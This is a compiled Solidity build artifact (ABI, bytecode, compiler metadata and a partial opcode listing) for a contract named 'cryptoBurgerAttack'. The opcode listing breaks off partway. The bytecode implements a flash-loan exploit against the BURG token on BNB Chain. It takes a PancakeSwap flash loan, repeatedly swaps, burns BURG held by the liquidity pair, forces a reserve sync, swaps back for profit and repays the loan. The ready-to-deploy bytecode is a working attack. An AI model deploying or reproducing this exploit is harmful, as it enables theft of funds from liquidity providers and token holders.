{
  "abi": [
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "string",
          "name": "message",
          "type": "string"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "LOG",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "string",
          "name": "message",
          "type": "string"
        },
        {
          "indexed": false,
          "internalType": "address",
          "name": "amount",
          "type": "address"
        }
      ],
      "name": "LOGAdd",
      "type": "event"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_tokenBorrow",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "_amount",
          "type": "uint256"
        }
      ],
      "name": "flashLoan",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_sender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "_amount0",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "_amount1",
          "type": "uint256"
        },
        {
          "internalType": "bytes",
          "name": "_data",
          "type": "bytes"
        }
      ],
      "name": "pancakeCall",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "6080604052600080546001600160a01b031990811673bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c179091556001805490911673f40d33de6737367a1ccb0ce6a056698d993a17e117905534801561005857600080fd5b50613053806100686000396000f3fe60806040526004361061002d5760003560e01c806384800812146100395780639d9e465c1461005b57600080fd5b3661003457005b600080fd5b34801561004557600080fd5b50610059610054366004612b97565b61007b565b005b34801561006757600080fd5b50610059610076366004612c2d565b6126e4565b6000336001600160a01b0316630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa1580156100bb573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100df9190612c59565b90506000336001600160a01b031663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa158015610121573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101459190612c59565b60405163e6a4390560e01b81526001600160a01b0380851660048301528216602482015290915060009073ca143ce32fe78f1f7019d7d551a6402fc5350c739063e6a4390590604401602060405180830381865afa1580156101ab573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101cf9190612c59565b9050336001600160a01b038216146102255760405162461bcd60e51b81526020600482015260146024820152734e6f742061207061697220636f6e74726163742160601b60448201526064015b60405180910390fd5b6001600160a01b03881630146102675760405162461bcd60e51b815260206004820152600760248201526610b9b2b73232b960c91b604482015260640161021c565b60008061027686880188612c2d565b6040805181815260138183015272436f6e74726163742062616c616e636520697360681b60608201524760208201529051929450909250600080516020612ffe833981519152919081900360800190a16040805160028082526060808301845269043c25e0dcc1bd1c00009390929190602083019080368337019050509050600080516020612f9e8339815191528160008151811061031757610317612c93565b60200260200101906001600160a01b031690816001600160a01b031681525050600080516020612f7e8339815191528160018151811061035957610359612c93565b6001600160a01b03909216602092830291909101909101526040516307c0329d60e21b8152606090600080516020612fbe83398151915290631f00ca74906103a79086908690600401612ced565b600060405180830381865afa1580156103c4573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526103ec9190810190612d0e565b6000546040516370a0823160e01b8152306004820152919250600080516020612ffe833981519152916001600160a01b03909116906370a0823190602401602060405180830381865afa158015610447573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061046b9190612dcc565b6040516104ce919060408082526033908201527f57424e422062616c616e6365206f6620636f6e7472616374206166746572207260608201527232b1b2b4bb3b34b73390333630b9b43637b0b760691b6080820152602081019190915260a00190565b60405180910390a1600080516020612ffe833981519152816000815181106104f8576104f8612c93565b602002602001015160405161054991906040808252602b90820152600080516020612fde83398151915260608201526a10212aa923903a37b5b2b760a91b6080820152602081019190915260a00190565b60405180910390a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa1580156105a7573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105cb9190612dcc565b6040516105d89190612de5565b60405180910390a1610624600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6020026020010151600030612986565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906106579086908690600401612ced565b600060405180830381865afa158015610674573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f1916820160405261069c9190810190612d0e565b9050600080516020612ffe833981519152816000815181106106c0576106c0612c93565b602002602001015160405161072391906040808252603c90820152600080516020612fde83398151915260608201527f204255524720746f6b656e2061667465722031737420737761703a20000000006080820152602081019190915260a00190565b60405180910390a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa158015610781573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107a59190612dcc565b6040516107b29190612de5565b60405180910390a16107ee600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906108219086908690600401612ced565b600060405180830381865afa15801561083e573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526108669190810190612d0e565b9050600080516020612ffe8339815191528160008151811061088a5761088a612c93565b60200260200101516040516108ed91906040808252603c90820152600080516020612fde83398151915260608201527f204255524720746f6b656e20616674657220326e6420737761703a20000000006080820152602081019190915260a00190565b60405180910390a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa15801561094b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061096f9190612dcc565b60405161097c9190612de5565b60405180910390a16109b8600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906109eb9086908690600401612ced565b600060405180830381865afa158015610a08573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052610a309190810190612d0e565b9050600080516020612ffe83398151915281600081518110610a5457610a54612c93565b6020026020010151604051610ab791906040808252603c90820152600080516020612fde83398151915260608201527f204255524720746f6b656e2061667465722033726420737761703a20000000006080820152602081019190915260a00190565b60405180910390a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa158015610b15573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610b399190612dcc565b604051610b469190612de5565b60405180910390a1610b82600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca7490610bb59086908690600401612ced565b600060405180830381865afa158015610bd2573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052610bfa9190810190612d0e565b9050600080516020612ffe83398151915281600081518110610c1e57610c1e612c93565b6020026020010151604051610c8191906040808252603c90820152600080516020612fde83398151915260608201527f204255524720746f6b656e2061667465722034746820737761703a20000000006080820152602081019190915260a00190565b60405180910390a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa158015610cdf573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610d039190612dcc565b604051610d109190612de5565b60405180910390a1610d4c600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca7490610d7f9086908690600401612ced565b600060405180830381865afa158015610d9c573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052610dc49190810190612d0e565b9050600080516020612ffe83398151915281600081518110610de857610de8612c93565b6020026020010151604051610e4b91906040808252603c90820152600080516020612fde83398151915260608201527f204255524720746f6b656e2061667465722035746820737761703a20000000006080820152602081019190915260a00190565b60405180910390a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa158015610ea9573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610ecd9190612dcc565b604051610eda9190612de5565b60405180910390a1610f16600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca7490610f499086908690600401612ced565b600060405180830381865afa158015610f66573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052610f8e9190810190612d0e565b9050600080516020612ffe83398151915281600081518110610fb257610fb2612c93565b602002602001015160405161101591906040808252603c90820152600080516020612fde83398151915260608201527f204255524720746f6b656e2061667465722036746820737761703a20000000006080820152602081019190915260a00190565b60405180910390a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa158015611073573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906110979190612dcc565b6040516110a49190612de5565b60405180910390a16110e0600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906111139086908690600401612ced565b600060405180830381865afa158015611130573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526111589190810190612d0e565b9050600080516020612ffe8339815191528160008151811061117c5761117c612c93565b60200260200101516040516111df91906040808252603c90820152600080516020612fde83398151915260608201527f204255524720746f6b656e2061667465722037746820737761703a20000000006080820152602081019190915260a00190565b60405180910390a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa15801561123d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906112619190612dcc565b60405161126e9190612de5565b60405180910390a16112aa600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906112dd9086908690600401612ced565b600060405180830381865afa1580156112fa573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526113229190810190612d0e565b6000546040516370a0823160e01b8152306004820152919250600080516020612ffe833981519152916001600160a01b03909116906370a0823190602401602060405180830381865afa15801561137d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906113a19190612dcc565b6040516113ae9190612de5565b60405180910390a1600080516020612ffe833981519152816000815181106113d8576113d8612c93565b602002602001015160405161143b91906040808252603c90820152600080516020612fde83398151915260608201527f204255524720746f6b656e2061667465722038746820737761703a20000000006080820152602081019190915260a00190565b60405180910390a1611477600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906114aa9086908690600401612ced565b600060405180830381865afa1580156114c7573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526114ef9190810190612d0e565b9050611525600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906115589086908690600401612ced565b600060405180830381865afa158015611575573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f1916820160405261159d9190810190612d0e565b90506115d3600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906116069086908690600401612ced565b600060405180830381865afa158015611623573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f1916820160405261164b9190810190612d0e565b9050611681600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906116b49086908690600401612ced565b600060405180830381865afa1580156116d1573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526116f99190810190612d0e565b905061172f600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906117629086908690600401612ced565b600060405180830381865afa15801561177f573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526117a79190810190612d0e565b90506117dd600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906118109086908690600401612ced565b600060405180830381865afa15801561182d573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526118559190810190612d0e565b905061188b600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906118be9086908690600401612ced565b600060405180830381865afa1580156118db573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526119039190810190612d0e565b9050611939600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca749061196c9086908690600401612ced565b600060405180830381865afa158015611989573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526119b19190810190612d0e565b90506119e7600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca7490611a1a9086908690600401612ced565b600060405180830381865afa158015611a37573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052611a5f9190810190612d0e565b9050611a95600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca7490611ac89086908690600401612ced565b600060405180830381865afa158015611ae5573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052611b0d9190810190612d0e565b9050611b43600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca7490611b769086908690600401612ced565b600060405180830381865afa158015611b93573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052611bbb9190810190612d0e565b9050611bf1600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa158015611c47573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611c6b9190612dcc565b604051611cc2919060408082526027908201527f57424e422042616c616e6365206f6620636f6e747261637420616674657220736060820152663bb0b83997171760c91b6080820152602081019190915260a00190565b60405180910390a1600080516020612ffe83398151915281600081518110611cec57611cec612c93565b602090810291909101810151604080518181529081018390527f486f77206d7563682049206e65656420666f7220616e6f74686572207377617060608201529182015260800160405180910390a160005b608d811015611dda57600154604051632770a7eb60e21b81527302b0551b656509754285eec81ee894338e14c5dd600482015269043c25e0dcc1bd1c000060248201526001600160a01b0390911690639dc29fac90604401600060405180830381600087803b158015611daf57600080fd5b505af1158015611dc3573d6000803e3d6000fd5b505050508080611dd290612e3a565b915050611d3d565b506001546040516370a0823160e01b81527302b0551b656509754285eec81ee894338e14c5dd6004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa158015611e45573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611e699190612dcc565b604051611eb091906040808252601c908201527f425552472062616c616e6365206f66205061636b6167652070616972000000006060820152602081019190915260800190565b60405180910390a17302b0551b656509754285eec81ee894338e14c5dd6001600160a01b031663fff6cae96040518163ffffffff1660e01b8152600401600060405180830381600087803b158015611f0757600080fd5b505af1158015611f1b573d6000803e3d6000fd5b50505050611f53600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b611f87600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b611fbb600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b611fef600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b612023600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b612057600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b61208b600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b6120bf600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b6120f3600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b612127600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b61215b600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b61218f600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b6121c3600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b6121f7600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b61222b600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b61225f600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b612293600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b6122c7600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b6122fb600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b6001546040516370a0823160e01b815230600482015261239191600080516020612f7e83398151915291600080516020612f9e833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa158015612365573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906123899190612dcc565b600030612986565b6001546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa1580156123e7573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061240b9190612dcc565b60405161245e919060408082526023908201527f425552472062616c616e6365206f6620636f6e7472616374206166746572207360608201526207761760ec1b6080820152602081019190915260a00190565b60405180910390a160006103e5612476866003612e53565b6124809190612e72565b61248b906001612e94565b905060006124998287612e94565b60405163a9059cbb60e01b81526001600160a01b038a81166004830152602482018390529192509088169063a9059cbb906044016020604051808303816000875af11580156124ec573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906125109190612eac565b5060408051818152600c818301526b14995c185e48185b5bdd5b9d60a21b6060820152602081018390529051600080516020612ffe8339815191529181900360800190a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa1580156125aa573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906125ce9190612dcc565b60405161260c91906040808252601490820152730283937b334ba1030b33a32b9103932b830bc9d160651b6060820152602081019190915260800190565b60405180910390a1600154604080516318160ddd60e01b81529051600080516020612ffe833981519152926001600160a01b0316916318160ddd9160048083019260209291908290030181865afa15801561266b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061268f9190612dcc565b6040516126cb919060408082526012908201527102a37ba30b610212aa9239039bab838363c960751b6060820152602081019190915260800190565b60405180910390a1505050505050505050505050505050565b60405163e6a4390560e01b81526001600160a01b0383166004820152738ac76a51cc950d9822d68b83fe1ad97b32cd580d602482015260009073ca143ce32fe78f1f7019d7d551a6402fc5350c739063e6a4390590604401602060405180830381865afa158015612759573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061277d9190612c59565b90506001600160a01b0381166127cc5760405162461bcd60e51b81526020600482015260146024820152735061697220646f65736e2774206578697374732160601b604482015260640161021c565b6000816001600160a01b0316630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa15801561280c573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906128309190612c59565b90506000826001600160a01b031663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa158015612872573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906128969190612c59565b90506000826001600160a01b0316866001600160a01b0316146128ba5760006128bc565b845b90506000826001600160a01b0316876001600160a01b0316146128e05760006128e2565b855b9050846001600160a01b031663022c0d9f8383308b8b60405160200161291d9291906001600160a01b03929092168252602082015260400190565b6040516020818303038152906040526040518563ffffffff1660e01b815260040161294b9493929190612ece565b600060405180830381600087803b15801561296557600080fd5b505af1158015612979573d6000803e3d6000fd5b5050505050505050505050565b60405163095ea7b360e01b81527302b0551b656509754285eec81ee894338e14c5dd6004820152602481018490526001600160a01b0386169063095ea7b3906044016020604051808303816000875af11580156129e7573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190612a0b9190612eac565b5060405163095ea7b360e01b8152600080516020612fbe8339815191526004820152602481018490526001600160a01b0386169063095ea7b3906044016020604051808303816000875af1158015612a67573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190612a8b9190612eac565b5060408051600280825260608083018452926020830190803683370190505090508581600081518110612ac057612ac0612c93565b60200260200101906001600160a01b031690816001600160a01b0316815250508481600181518110612af457612af4612c93565b6001600160a01b0390921660209283029190910190910152604051635c11d79560e01b8152600080516020612fbe83398151915290635c11d79590612b459087908790869088904290600401612f41565b600060405180830381600087803b158015612b5f57600080fd5b505af1158015612b73573d6000803e3d6000fd5b50505050505050505050565b6001600160a01b0381168114612b9457600080fd5b50565b600080600080600060808688031215612baf57600080fd5b8535612bba81612b7f565b94506020860135935060408601359250606086013567ffffffffffffffff80821115612be557600080fd5b818801915088601f830112612bf957600080fd5b813581811115612c0857600080fd5b896020828501011115612c1a57600080fd5b9699959850939650602001949392505050565b60008060408385031215612c4057600080fd5b8235612c4b81612b7f565b946020939093013593505050565b600060208284031215612c6b57600080fd5b8151612c7681612b7f565b9392505050565b634e487b7160e01b600052604160045260246000fd5b634e487b7160e01b600052603260045260246000fd5b600081518084526020808501945080840160005b83811015612ce25781516001600160a01b031687529582019590820190600101612cbd565b509495945050505050565b828152604060208201526000612d066040830184612ca9565b949350505050565b60006020808385031215612d2157600080fd5b825167ffffffffffffffff80821115612d3957600080fd5b818501915085601f830112612d4d57600080fd5b815181811115612d5f57612d5f612c7d565b8060051b604051601f19603f83011681018181108582111715612d8457612d84612c7d565b604052918252848201925083810185019188831115612da257600080fd5b938501935b82851015612dc057845184529385019392850192612da7565b98975050505050505050565b600060208284031215612dde57600080fd5b5051919050565b60408082526018908201527f57424e422062616c616e6365206f6620636f6e747261637400000000000000006060820152602081019190915260800190565b634e487b7160e01b600052601160045260246000fd5b600060018201612e4c57612e4c612e24565b5060010190565b6000816000190483118215151615612e6d57612e6d612e24565b500290565b600082612e8f57634e487b7160e01b600052601260045260246000fd5b500490565b60008219821115612ea757612ea7612e24565b500190565b600060208284031215612ebe57600080fd5b81518015158114612c7657600080fd5b84815260006020858184015260018060a01b038516604084015260806060840152835180608085015260005b81811015612f165785810183015185820160a001528201612efa565b81811115612f2857600060a083870101525b50601f01601f19169290920160a0019695505050505050565b85815284602082015260a060408201526000612f6060a0830186612ca9565b6001600160a01b039490941660608301525060800152939250505056fe000000000000000000000000f40d33de6737367a1ccb0ce6a056698d993a17e1000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c00000000000000000000000010ed43c718714eb63d5aa57b78b54704e256024e5468652072657175697265642057424e4220616d6f756e7420666f722031394d500a5c23c900bdde1352bb093d0b6480339dc3317c387f4a23ff9aecc606ff45a2646970667358221220e13b67340fb96dcbb1ab3fc96bdae0eff6ad2686696e44c927205c673a92985764736f6c634300080d0033",
  "bytecodeSha1": "fd46b53d83301434270f0e96defc45942d253031",
  "compiler": {
    "evm_version": "istanbul",
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "version": "0.8.13+commit.abaa5c0e"
  },
  "contractName": "cryptoBurgerAttack",
  "language": "Solidity",
  "natspec": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2D JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x84800812 EQ PUSH2 0x39 JUMPI DUP1 PUSH4 0x9D9E465C EQ PUSH2 0x5B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST CALLDATASIZE PUSH2 0x34 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x45 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x59 PUSH2 0x54 CALLDATASIZE PUSH1 0x4 PUSH2 0x2B97 JUMP JUMPDEST PUSH2 0x7B JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x67 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x59 PUSH2 0x76 CALLDATASIZE PUSH1 0x4 PUSH2 0x2C2D JUMP JUMPDEST PUSH2 0x26E4 JUMP JUMPDEST PUSH1 0x0 CALLER PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xDFE1681 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xBB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xDF SWAP2 SWAP1 PUSH2 0x2C59 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 CALLER PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0xD21220A7 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x121 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x145 SWAP2 SWAP1 PUSH2 0x2C59 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH4 0xE6A43905 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP1 DUP6 AND PUSH1 0x4 DUP4 ADD MSTORE DUP3 AND PUSH1 0x24 DUP3 ADD MSTORE SWAP1 SWAP2 POP PUSH1 0x0 SWAP1 PUSH20 0xCA143CE32FE78F1F7019D7D551A6402FC5350C73 SWAP1 PUSH4 0xE6A43905 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x1AB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1CF SWAP2 SWAP1 PUSH2 0x2C59 JUMP JUMPDEST SWAP1 POP CALLER PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP3 AND EQ PUSH2 0x225 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x14 PUSH1 0x24 DUP3 ADD MSTORE PUSH20 0x4E6F742061207061697220636F6E747261637421 PUSH1 0x60 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP9 AND ADDRESS EQ PUSH2 0x267 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x7 PUSH1 0x24 DUP3 ADD MSTORE PUSH7 0x10B9B2B73232B9 PUSH1 0xC9 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x21C JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x276 DUP7 DUP9 ADD DUP9 PUSH2 0x2C2D JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP2 DUP2 MSTORE PUSH1 0x13 DUP2 DUP4 ADD MSTORE PUSH19 0x436F6E74726163742062616C616E6365206973 PUSH1 0x68 SHL PUSH1 0x60 DUP3 ADD MSTORE SELFBALANCE PUSH1 0x20 DUP3 ADD MSTORE SWAP1 MLOAD SWAP3 SWAP5 POP SWAP1 SWAP3 POP PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0x2FFE DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE SWAP2 SWAP1 DUP2 SWAP1 SUB PUSH1 0x80 ADD SWAP1 LOG1 PUSH1 0x40 DUP1 MLOAD PUSH1 0x2 DUP1 DUP3 MSTORE PUSH1 0x60 DUP1 DUP4 ADD DUP5 MSTORE PUSH10 0x43C25E0DCC1BD1C0000 SWAP4 SWAP1 SWAP3 SWAP2 SWAP1 PUSH1 0x20 DUP4 ADD SWAP1 DUP1 CALLDATASIZE DUP4 CALLDATACOPY ADD SWAP1 POP POP SWAP1 POP PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 